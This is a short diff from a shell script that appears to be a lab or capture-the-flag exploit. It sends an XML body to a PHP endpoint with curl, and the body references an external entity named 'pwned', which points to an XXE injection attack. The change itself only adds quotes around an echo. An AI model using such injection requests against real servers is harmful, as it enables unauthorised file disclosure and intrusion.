@@ -16,4 +16,4 @@ request=$(curl -s -X POST "http://<IP>/submitDetails.php" \
                <email>&pwned;</email>
                <message>Git Pwn3d Ez</message>
              </root>')
-echo $request
+echo "$request"
